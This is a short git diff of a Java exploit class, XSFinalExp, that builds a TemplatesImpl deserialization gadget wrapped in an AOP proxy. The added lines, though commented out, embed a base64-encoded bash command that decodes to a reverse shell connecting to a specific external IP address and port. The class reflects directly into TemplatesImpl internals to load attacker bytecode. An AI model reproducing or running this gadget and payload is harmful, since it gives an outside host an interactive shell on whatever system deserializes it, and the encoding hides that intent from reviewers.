@@ -54,6 +54,12 @@ public class XSFinalExp {
     }
 
     public static Object makeTemplatesImplAopProxy() throws Exception {
+//        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+//        setValue(templates, "_bytecodes", new byte[][]{genPayload("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MS4xMzkuNjUuMTQzLzM2NjkyIDA+JjE=}|{base64,-d}|{bash,-i}")});
+//        setValue(templates, "_name", "1");
+//        setValue(templates, "_tfactory", null);
+
+
         TemplatesImpl templates = new TemplatesImpl();
         Class tc = templates.getClass();
         Field nameField = tc.getDeclaredField("_name");
@@ -104,5 +110,6 @@ public class XSFinalExp {
     }
 
 }
+
 
 ```
